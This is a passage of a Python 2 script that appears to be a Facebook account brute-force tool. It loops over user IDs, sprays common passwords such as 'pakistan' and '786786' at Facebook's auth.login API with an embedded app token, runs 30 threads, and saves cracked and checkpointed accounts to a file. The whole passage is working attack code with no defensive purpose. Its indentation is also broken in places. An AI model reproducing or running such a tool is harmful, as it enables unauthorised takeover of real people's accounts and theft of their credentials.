			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass63)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass63 + ' - ' + b['name']
				oks.append(user+pass63)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass63 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass63+"\n")
					cek.close()
					cekpoint.append(user+pass63)
                                  else:
pass64 = 'qwertyuiop'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass64)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass64 + ' - ' + b['name']
				oks.append(user+pass64)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass64 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass64+"\n")
					cek.close()
					cekpoint.append(user+pass64)
                                  else:
pass65 = 'pakistan'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass65)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass65 + ' - ' + b['name']
				oks.append(user+pass65)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass65 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass65+"\n")
					cek.close()
					cekpoint.append(user+pass65)
                                  else:
pass66 = '999999'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass66)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass66 + ' - ' + b['name']
				oks.append(user+pass66)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass66 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass66+"\n")
					cek.close()
					cekpoint.append(user+pass66)
                                  else:
pass67 = '786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass67)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass67 + ' - ' + b['name']
				oks.append(user+pass67)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass67 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass67+"\n")
					cek.close()
					cekpoint.append(user+pass67)
                                  else:
pass68 = 'abcd'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass68)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass68 + ' - ' + b['name']
				oks.append(user+pass68)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass68 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass68+"\n")
					cek.close()
					cekpoint.append(user+pass68)
                                  else:
pass69 = 'abcd12'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass69)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass69 + ' - ' + b['name']
				oks.append(user+pass69)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass69 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass69+"\n")
					cek.close()
					cekpoint.append(user+pass69)
                                  else:
pass70 = 'abcd123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass70)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;96m[\x1b[1;92mOK\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass70 + ' - ' + b['name']
				oks.append(user+pass70)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;96m[\x1b[1;93mCP\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass70 + ' - ' + b['name']
					cek = open("sg/ok_cp.txt", "a")
					cek.write(user+"|"+pass70+"\n")
					cek.close()
					cekpoint.append(user+pass70)                  
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════════⊱⋕⊰" 
	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mProcess Has Been Completed \033[1;97m....'
	print"\033[1;96m[+] \033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97msg/checkpoint.txt")
	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
	menu()

if __name__ == '__main__':
	login()
